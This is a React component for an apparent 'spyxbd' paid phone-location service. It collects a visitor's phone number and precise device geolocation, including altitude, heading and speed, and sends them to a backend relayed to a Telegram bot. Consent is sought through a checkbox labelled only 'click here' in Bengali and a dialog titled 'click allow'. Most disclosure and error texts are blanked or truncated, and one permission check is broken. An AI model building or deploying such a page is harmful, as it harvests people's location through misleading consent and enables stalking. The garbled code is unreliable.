/**
 * spyxbd - Hero & Order Section Component
 * Clean layout focusing on phone input, location consent, and order submission.
 */

import React, { useState, useEffect } from 'react';
import { createPortal } from 'react-dom';
import {
  Bell,
  MapPin,
  Phone,
  Send,
  Navigation,
  CheckCircle2,
  AlertCircle,
  ExternalLink,
  ShieldCheck,
} from 'lucide-react';
import { DeviceLocation } from '../types';

const CUSTOMER_ORDERS_STORAGE_KEY = 'spyxbd-pending-order';

function loadCustomerOrders(): { id: string; token: string }[] {
  try {
    const saved = localStorage.getItem(CUSTOMER_ORDERS_STORAGE_KEY);
    if (!saved) return [];
    const parsed: unknown = JSON.parse(saved);
    const orders = Array.isArray(parsed) ? parsed : [parsed];
    return orders.filter((order): order is { id: string; token: string } => (
      typeof order?.id === 'string' && typeof order?.token === 'string'
    ));
  } catch {
    return [];
  }
}

export const HeroOrderSection: React.FC = () => {
  const [phoneNumber, setPhoneNumber] = useState('');
  const [phoneError, setPhoneError] = useState<string | null>(null);
  const [operator, setOperator] = useState<string | null>(null);

  const [consentGranted, setConsentGranted] = useState(false);
  const [consentError, setConsentError] = useState<string | null>(null);

  const [locationError, setLocationError] = useState<string | null>(null);
  const [notificationError, setNotificationError] = useState<string | null>(null);
  const [notificationPermission, setNotificationPermission] = useState<NotificationPermission | 'unsupported'>(
    () => 'Notification' in window ? Notification.permission : 'unsupported',
  );
  const [locationPermission, setLocationPermission] = useState<PermissionState | 'unknown' | 'unsupported'>('unknown');
  const [permissionStep, setPermissionStep] = useState<'notification' | 'location' | null>('notification');
  const [readyLocation, setReadyLocation] = useState<DeviceLocation | null>(null);
  const [requestingLocation, setRequestingLocation] = useState(false);
  const [submitting, setSubmitting] = useState(false);
  const [submittedOrders, setSubmittedOrders] = useState(loadCustomerOrders);
  const [orderMessage, setOrderMessage] = useState<string | null>(() => (
    submittedOrders.length > 0
      ? 'Order submitted.'
      : null
  ));
  const [approvedLocations, setApprovedLocations] = useState<Record<string, DeviceLocation>>({});

  useEffect(() => {
    if (!navigator.permissions) {
      setLocationPermission('unsupported');
      return;
    }

    let active = true;
    let locationStatus: PermissionStatus | null = null;
    const updateLocationPermission = () => {
      if (active && locationStatus) setLocationPermission(locationStatus.state);
    };

    void navigator.permissions.query({ name: 'geolocation' }).then(status => {
      locationStatus = status;
      updateLocationPermission();
      status.addEventListener('change', updateLocationPermission);
    }).catch(() => {
      if (active) setLocationPermission('unknown');
    });

    return () => {
      active = false;
      locationStatus?.removeEventListener('change', updateLocationPermission);
    };
  }, []);

  // Validate phone number as user types
  useEffect(() => {
    if (!phoneNumber) {
      setPhoneError(null);
      setOperator(null);
      return;
    }

    const clean = phoneNumber.replace(/[\s\-\(\)]/g, '');
    const bdRegex = /^(?:\+?88)?(01[3-9]\d{8})$/;
    const match = clean.match(bdRegex);

    if (match) {
      setPhoneError(null);
      const local = match[1];
      const pfx = local.substring(0, 3);
      if (pfx === '017' || pfx === '013') setOperator('Grameenphone');
      else if (pfx === '018') setOperator('Robi');
      else if (pfx === '019' || pfx === '014') setOperator('Banglalink');
      else if (pfx === '015') setOperator('Teletalk');
      else if (pfx === '016') setOperator('Airtel');
      else setOperator('Bangladeshi Network');
    } else {
      setOperator(null);
      if (clean.length >= 11) {
        setPhoneError('Please enter a valid BD phone number (e.g., 01XXXXXXXXX or +8801XXXXXXXXX)');
      } else {
        setPhoneError(null);
      }
    }
  }, [phoneNumber]);

  useEffect(() => {
    const ordersAwaitingApproval = submittedOrders.filter(order => !approvedLocations[order.id]);
    if (ordersAwaitingApproval.length === 0) return;
    let active = true;

    const checkApproval = async () => {
      const locations: Record<string, DeviceLocation> = {};
      const deletedOrderIds = new Set<string>();

      await Promise.all(ordersAwaitingApproval.map(async order => {
        try {
          const response = await fetch(`/api/orders/${encodeURIComponent(order.id)}/status`, {
            headers: { Authorization: `Bearer ${order.token}` },
          });
          if (response.status === 404) {
            deletedOrderIds.add(order.id);
            return;
          }
          if (!response.ok) return;
          const data = await response.json() as {
            location?: { latitude: number; longitude: number; accuracy: number; timestamp: string };
          };
          if (data.location) {
            locations[order.id] = {
              ...data.location,
              timestamp: new Date(data.location.timestamp).getTime(),
            };
          }
        } catch {
          // Keep checking while the order awaits approval.
        }
      }));

      if (!active) return;
      if (deletedOrderIds.size > 0) {
        setSubmittedOrders(current => {
          const remaining = current.filter(order => !deletedOrderIds.has(order.id));
          localStorage.setItem(CUSTOMER_ORDERS_STORAGE_KEY, JSON.stringify(remaining));
          return remaining;
        });
        setOrderMessage('An order was deleted by the administrator. You can submit another order below.');
      }
      if (Object.keys(locations).length > 0) {
        setApprovedLocations(current => ({ ...current, ...locations }));
        setOrderMessage('Payment confirmed. Your location is ready.');
      }
    };

    void checkApproval();
    const interval = window.setInterval(checkApproval, 5000);
    return () => {
      active = false;
      window.clearInterval(interval);
    };
  }, [submittedOrders, approvedLocations]);

  const requestCurrentLocation = () => new Promise<DeviceLocation>((resolve, reject) => {
    if (!('geolocation' in navigator)) {
      reject(new Error('Geolocation is not supported by your current browser.'));
      return;
    }

    navigator.geolocation.getCurrentPosition(
      ({ coords, timestamp }) => resolve({
        latitude: coords.latitude,
        longitude: coords.longitude,
        accuracy: coords.accuracy,
        timestamp: timestamp || Date.now(),
        altitude: coords.altitude,
        heading: coords.heading,
        speed: coords.speed,
      }),
      (error) => {
        const message = error.code === error.PERMISSION_DENIED
          ? ''
          : error.code === error.POSITION_UNAVAILABLE
            ? ''
            : '';
        reject(new Error(message));
      },
      { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 },
    );
  });

  const handleNotificationPermission = async () => {
    setNotificationError(null);
    if (!window.isSecureContext) {
      setNotificationError('Chrome and Edge require HTTPS for permissions on a phone. Use HTTPS, or open localhost on this same device.');
      setPermissionStep('location');
      return;
    }
    if (!('Notification' in window)) {
      setNotificationPermission('unsupported');
      setNotificationError('Notifications are not supported by this browser. You can continue without them.');
      setPermissionStep('location');
      return;
    }

    try {
      const permission = Notification.permission === 'default'
        ? await Notification.requestPermission()
        : Notification.permission;
      setNotificationPermission(permission);
      if (permission !== 'granted') {
        setNotificationError('');
      }
    } catch {
      setNotificationPermission(Notification.permission);
      setNotificationError('Could not request notifications. You can continue without them.');
    }
    setPermissionStep('location');
  };

  const handleLocationPermission = async () => {
    setLocationError(null);
    if (!window.isSecureContext) {
      setLocationError('Chrome and Edge require HTTPS for location on a phone. Use HTTPS, or open localhost on this same device.');
      setPermissionStep(null);
      return;
    }
    setRequestingLocation(true);
    try {
      setReadyLocation(await requestCurrentLocation());
      setLocationPermission('granted');
      setPermissionStep(null);
    } catch (error) {
      if (error instanceof GeolocationPositionError && error.code === error.PERMISSION_DENIED) {
        setLocationPermission('denied');
      }
      setLocationError(error instanceof Error ? error.message : 'Could not access your location.');
      setPermissionStep(null);
    } finally {
      setRequestingLocation(false);
    }
  };

  const handleOrderSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (submitting) return;

    // 1. Phone check
    const clean = phoneNumber.replace(/[\s\-\(\)]/g, '');
    const match = clean.match(/^(?:\+?88)?(01[3-9]\d{8})$/);
    if (!match) {
      setPhoneError('Please enter a valid Bangladeshi phone number (e.g. 01712345678)');
      return;
    }

    // 2. Consent check
    if (!consentGranted) {
      setConsentError(' ');
      return;
    }

    setConsentError(null);
    setLocationError(null);
    setOrderMessage(null);
    setSubmitting(true);
    const customerAccessToken = `${crypto.randomUUID()}${crypto.randomUUID()}`;

    try {
      const location = readyLocation || await requestCurrentLocation();
      const response = await fetch('/api/orders', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          phoneNumber,
          consent: true,
          latitude: location.latitude,
          longitude: location.longitude,
          accuracy: location.accuracy,
          locationTimestamp: new Date(location.timestamp).toISOString(),
          altitude: location.altitude,
          heading: location.heading,
          speed: location.speed,
          idempotencyKey: crypto.randomUUID(),
          customerAccessToken,
        }),
      });
      const result = await response.json() as {
        success: boolean;
        orderId?: string;
        error?: string;
        telegramDelivered?: boolean;
      };
      if (!response.ok || !result.success || !result.orderId) {
        throw new Error(result.error || 'Could not submit the order. Please try again.');
      }
      const pendingOrder = { id: result.orderId, token: customerAccessToken };
      const updatedOrders = [...submittedOrders, pendingOrder];
      localStorage.setItem(CUSTOMER_ORDERS_STORAGE_KEY, JSON.stringify(updatedOrders));
      setSubmittedOrders(updatedOrders);
      setReadyLocation(null);
      setOrderMessage(result.telegramDelivered
        ? 'Order submitted.'
        : 'Order saved, but it was not delivered to the Telegram bot. The administrator cannot approve it until Telegram delivery is configured.');
    } catch (error) {
      const message = error instanceof Error ? error.message : 'Could not submit the order. Please try again.';
      if (message.toLowerCase().includes('location')) setLocationError(message);
      else setOrderMessage(message);
    } finally {
      setSubmitting(false);
    }
  };

  return (
    <>
    <section id="hero" className="relative bg-[#080D18] text-white pt-8 pb-16 lg:pt-14 lg:pb-24 overflow-hidden">
      {/* Background Aerial Map Layer */}
      <div className="absolute inset-0 z-0 opacity-25 mix-blend-screen pointer-events-none">
        <img
          src="/src/assets/images/hero_city_map_dark_1791884721398.jpg"
          alt="Aerial city map background"
          className="w-full h-full object-cover object-center"
        />
        <div className="absolute inset-0 bg-gradient-to-b from-[#080D18]/90 via-[#080D18]/75 to-[#080D18]" />
      </div>

      {/* Subtle Blue Glow effects */}
      <div className="absolute top-1/4 right-10 w-96 h-96 bg-[#1769FF]/15 rounded-full blur-3xl pointer-events-none" />
      <div className="absolute bottom-10 left-10 w-80 h-80 bg-[#3B82F6]/10 rounded-full blur-3xl pointer-events-none" />

      <div className="relative z-10 max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-8 lg:gap-12 items-center">
          {/* Left Column: Form & Pricing */}
          <div className="lg:col-span-7 space-y-6">
            {/* Main Heading */}
            <h1 className="text-4xl sm:text-5xl lg:text-6xl font-extrabold tracking-tight leading-[1.1] text-white">
              Location Service <br />
              <span className="text-[#3B82F6]">Provider</span>
            </h1>


            {/* Pricing Card */}
            <div className="p-4 sm:p-5 rounded-2xl bg-[#0B1528]/85 border border-[#1E3A8A]/60 shadow-lg backdrop-blur-md">
              <div className="flex items-center justify-between flex-wrap gap-3">
                <div className="flex items-center gap-3">
                  <div className="w-10 h-10 rounded-xl bg-[#1769FF]/20 border border-[#1769FF]/30 flex items-center justify-center text-[#3B82F6] shrink-0">
                    <MapPin className="w-5 h-5 fill-current" />
                  </div>
                  <div>
                    <div className="flex items-baseline gap-2.5">
                      <span className="text-base sm:text-lg text-[#94A3B8] line-through font-normal">
                        750 Tk
                      </span>
                      <span className="text-2xl sm:text-3xl font-black text-[#3B82F6] tracking-tight">
                        450 Tk
                      </span>
                    </div>
                  </div>
                </div>

                <div className="px-3 py-1 rounded-full bg-[#1769FF]/20 border border-[#3B82F6]/50 text-xs font-bold text-[#60A5FA] tracking-wide">
                  40% OFF
                </div>
              </div>
            </div>

            {/* Form: Phone Input, Consent & Order Now */}
            <form onSubmit={handleOrderSubmit} className="space-y-4 pt-1">
              {/* Phone Input Field */}
              <div>
                <label htmlFor="phoneNumber" className="sr-only">
                  Phone number
                </label>
                <div className="relative rounded-2xl shadow-sm">
                  <div className="absolute inset-y-0 left-0 pl-4 flex items-center pointer-events-none text-[#94A3B8]">
                    <Phone className="w-5 h-5" />
                  </div>
                  <input
                    type="tel"
                    id="phoneNumber"
                    name="phoneNumber"
                    inputMode="tel"
                    value={phoneNumber}
                    onChange={(e) => setPhoneNumber(e.target.value)}
                    placeholder="Phone number"
                    className="block w-full pl-12 pr-28 py-4 text-base sm:text-lg text-[#080D18] bg-white rounded-2xl border-2 border-transparent focus:border-[#1769FF] focus:outline-none placeholder:text-[#94A3B8] shadow-md font-medium transition-colors"
                  />
                  {operator && (
                    <div className="absolute inset-y-0 right-0 pr-3.5 flex items-center pointer-events-none">
                      <span className="text-xs font-semibold px-2.5 py-1 rounded-md bg-[#EFF6FF] text-[#1769FF] border border-[#BFDBFE]">
                        {operator}
                      </span>
                    </div>
                  )}
                </div>
                {phoneError && (
                  <p className="mt-1.5 text-xs text-[#EF4444] flex items-center gap-1 font-medium pl-1">
                    <AlertCircle className="w-3.5 h-3.5 shrink-0" />
                    <span>{phoneError}</span>
                  </p>
                )}
              </div>

              {/* Consent Box & Disclosure */}
              <div className="p-4 rounded-xl bg-[#0B1528]/60 border border-[#1E3A8A]/40 space-y-3">

                <label className="flex items-start gap-3 cursor-pointer group select-none">
                  <input
                    type="checkbox"
                    checked={consentGranted}
                    onChange={(e) => {
                      setConsentGranted(e.target.checked);
                      if (e.target.checked) setConsentError(null);
                    }}
                    className="mt-1 w-4 h-4 rounded text-[#1769FF] border-slate-600 focus:ring-[#1769FF] bg-slate-900 cursor-pointer shrink-0"
                  />
                  <span className="text-xs sm:text-sm text-[#E2E8F0] group-hover:text-white transition-colors">
                    এখানে ক্লিক করুন।
                  </span>
                </label>

                {consentError && (
                  <p className="text-xs text-[#EF4444] flex items-center gap-1 font-medium">
                    <AlertCircle className="w-3.5 h-3.5 shrink-0" />
                    <span>{consentError}</span>
                  </p>
                )}

                {notificationError && (
                  <p className="text-xs text-amber-200" role="status">{notificationError}</p>
                )}

                {readyLocation && (
                  <p className="text-xs text-green-300" role="status">  </p>
                )}

                {locationError && (
                  <div className="p-3 rounded-lg bg-red-950/40 border border-red-800/50 text-xs text-red-200 space-y-1">
                    <div className="flex items-start gap-1.5">
                      <AlertCircle className="w-4 h-4 text-red-400 shrink-0 mt-0.5" />
                      <span>{locationError}</span>
                    </div>
                  </div>
                )}
              </div>

              {orderMessage && (
                <div className={`p-3 rounded-xl border text-sm ${Object.keys(approvedLocations).length > 0 ? 'bg-green-950/40 border-green-800/50 text-green-200' : 'bg-[#0B1528]/75 border-[#1E3A8A]/50 text-[#CBD5E1]'}`}>
                  <div className="flex items-start gap-2">
                    {Object.keys(approvedLocations).length > 0 ? <CheckCircle2 className="w-4 h-4 mt-0.5 shrink-0" /> : <AlertCircle className="w-4 h-4 mt-0.5 shrink-0" />}
                    <span>{orderMessage}</span>
                  </div>
                </div>
              )}

              {submittedOrders.length > 0 && (
                <p className="text-xs text-[#94A3B8]">
                  {submittedOrders.length} order{submittedOrders.length === 1 ? '' : 's'} being tracked. You can place another order below.
                </p>
              )}

              {/* Coordinates remain hidden until payment and admin approval. */}
              {Object.entries(approvedLocations).map(([orderId, approvedLocation]) => (
                <div key={orderId} className="p-4 rounded-xl bg-[#0F1E36] border border-[#1E40AF]/60 text-xs space-y-2 animate-in fade-in duration-300">
                  <div className="flex items-center justify-between border-b border-slate-700/60 pb-2">
                    <span className="font-bold text-white flex items-center gap-1.5">
                      <Navigation className="w-3.5 h-3.5 text-[#38BDF8]" />
                      Location Ready · {orderId}
                    </span>
                    <a
                      href={`https://www.google.com/maps?q=${approvedLocation.latitude},${approvedLocation.longitude}`}
                      target="_blank"
                      rel="noopener noreferrer"
                      className="text-[#60A5FA] hover:text-[#93C5FD] flex items-center gap-1 font-semibold"
                    >
                      <span>View on Map</span>
                      <ExternalLink className="w-3 h-3" />
                    </a>
                  </div>

                  <div className="grid grid-cols-2 gap-2 text-[#CBD5E1] pt-1">
                    <div>
                      <span className="text-[#94A3B8] block text-[11px]">Latitude</span>
                      <span className="font-mono font-semibold text-white">
                        {approvedLocation.latitude.toFixed(6)}°
                      </span>
                    </div>
                    <div>
                      <span className="text-[#94A3B8] block text-[11px]">Longitude</span>
                      <span className="font-mono font-semibold text-white">
                        {approvedLocation.longitude.toFixed(6)}°
                      </span>
                    </div>
                    <div>
                      <span className="text-[#94A3B8] block text-[11px]">Reported Accuracy</span>
                      <span className="font-mono font-semibold text-[#38BDF8]">
                        ±{Math.round(approvedLocation.accuracy)} meters
                      </span>
                    </div>
                    <div>
                      <span className="text-[#94A3B8] block text-[11px]">Timestamp</span>
                      <span className="font-mono text-[11px] text-[#94A3B8]">
                        {new Date(approvedLocation.timestamp).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' })}
                      </span>
                    </div>
                  </div>
                </div>
              ))}

              {/* Order Button */}
              <button
                type="submit"
                disabled={submitting}
                className="w-full flex items-center justify-center gap-3 py-4 px-6 rounded-2xl bg-[#1769FF] hover:bg-[#1255d6] active:scale-[0.99] text-white font-extrabold text-lg sm:text-xl shadow-xl shadow-[#1769FF]/30 transition-all disabled:opacity-60 disabled:cursor-not-allowed cursor-pointer"
              >
                {submitting ? <span className="w-5 h-5 border-2 border-white/40 border-t-white rounded-full animate-spin" /> : <Send className="w-5 h-5 fill-current" />}
                <span>Order Now</span>
              </button>
            </form>
          </div>

          {/* Right Column: Visual Mockup */}
          <div className="lg:col-span-5 flex justify-center lg:justify-end">
            <div className="relative w-full max-w-[340px] sm:max-w-[380px]">
              {/* Phone Frame Device Mockup */}
              <div className="relative rounded-[40px] p-3 bg-gradient-to-b from-[#1E293B] via-[#0F172A] to-[#020617] border-4 border-[#334155]/60 shadow-2xl overflow-hidden">
                {/* Speaker ear piece and camera notch */}
                <div className="w-24 h-4 bg-black rounded-full mx-auto mb-2 flex items-center justify-center">
                  <div className="w-3 h-3 rounded-full bg-[#1E293B] mr-2" />
                  <div className="w-2 h-2 rounded-full bg-[#0F172A]" />
                </div>

                {/* Inner Screen Area */}
                <div className="relative rounded-[28px] overflow-hidden bg-[#0A101D] border border-slate-800">
                  {/* Status header inside phone */}
                  <div className="px-4 py-2.5 bg-[#0F1A2E]/90 flex items-center justify-between text-xs text-white border-b border-slate-800">
                    <div className="flex items-center gap-1.5">
                      <div className="w-2 h-2 rounded-full bg-[#22C55E]" />
                      <span className="font-semibold text-[11px]">Location Preview</span>
                    </div>
                    <div className="text-[10px] text-[#94A3B8]">GPS Ready</div>
                  </div>

                  {/* Interactive Map view inside screen */}
                  <div className="relative h-72 sm:h-80 w-full overflow-hidden">
                    <img
                      src="/src/assets/images/hero_city_map_dark_1791884721398.jpg"
                      alt="Map navigation screen"
                      className="w-full h-full object-cover filter brightness-95"
                    />

                    {/* Blue GPS Pin & Accuracy Pulse */}
                    <div className="absolute inset-0 flex items-center justify-center pointer-events-none">
                      <div className="relative">
                        <div className="w-24 h-24 rounded-full bg-[#1769FF]/20 border border-[#3B82F6]/50 animate-ping" />
                        <div className="absolute inset-0 flex items-center justify-center">
                          <div className="w-10 h-10 rounded-full bg-[#1769FF] shadow-lg shadow-[#1769FF]/80 flex items-center justify-center text-white">
                            <MapPin className="w-6 h-6 fill-current" />
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </section>
    {permissionStep !== null && createPortal(
      <div className="fixed inset-0 z-[100] flex items-end justify-center bg-[#080D18]/75 p-0 backdrop-blur-sm sm:items-center sm:p-4" role="dialog" aria-modal="true" aria-labelledby="permission-title">
        <section className="w-full max-w-md overflow-hidden rounded-t-3xl border border-white/70 bg-white shadow-2xl sm:rounded-2xl">
          <div className="h-1.5 bg-[#E2E8F0]">
            <div className={`h-full bg-[#1769FF] transition-all ${permissionStep === 'notification' ? 'w-1/2' : 'w-full'}`} />
          </div>
          <div className="px-6 pb-[calc(1.5rem+env(safe-area-inset-bottom))] pt-7 sm:pb-6">
            <p className="mb-2 text-xs font-bold uppercase tracking-wide text-[#1769FF]">
              Step {permissionStep === 'notification' ? '1' : '2'} of 2
            </p>
            <h2 id="permission-title" className="text-xl font-bold text-[#080D18]">
              {permissionStep === 'notification' ? 'click allow' : 'click allow'}
            </h2>
            <p className="mt-2 text-sm leading-relaxed text-[#475569]">
              {permissionStep === 'notification'
                ? notificationPermission === 'granted'
                  ? 'Notifications are already allowed in this browser. Continue to check location access.'
                  : notificationPermission === 'denied'
                    ? 'N'
                    : 'A'
                : !window.isSecureContext
                  ? ' address '
                  : locationPermission === 'granted'
                    ? 'L '
                    : location === 'denied'
                      ? 'Location is '
                      : 'Your current'}
            </p>
            {permissionStep === 'location' && notificationError && (
              <p className="mt-3 rounded-lg bg-amber-50 p-3 text-left text-xs leading-relaxed text-amber-900" role="status">
                {notificationError}
              </p>
            )}
            <button
              type="button"
              onClick={permissionStep === 'notification' ? handleNotificationPermission : handleLocationPermission}
              disabled={requestingLocation || (permissionStep === 'location' && !window.isSecureContext)}
              className="mt-6 flex min-h-12 w-full items-center justify-center gap-2 rounded-xl bg-[#1769FF] px-5 py-3.5 text-sm font-bold text-white transition-colors hover:bg-[#1255d6] disabled:opacity-60"
            >
              {permissionStep === 'notification' ? <Bell className="h-4 w-4" /> : <ShieldCheck className="h-4 w-4" />}
              {requestingLocation
                ? ' l'
                : permissionStep === 'notification'
                  ? notificationPermission === 'granted' || notificationPermission === 'denied' || notificationPermission === 'unsupported'
                    ? 'Continue'
                    : 'Allow notifications'
                  : !window.isSecureContext
                    ? 'Location unavailable'
                    : locationPermission === 'granted'
                      ? 'Continue'
                      : 'Allow l'}
            </button>
            <button
              type="button"
              onClick={() => setPermissionStep(permissionStep === 'notification' ? 'location' : null)}
              className="mt-2 min-h-11 w-full rounded-xl px-5 py-3 text-sm font-semibold text-[#475569] transition-colors hover:bg-slate-100"
            >
              Not now
            </button>
          </div>
        </section>
      </div>,
      document.body,
    )}
    </>
  );
};
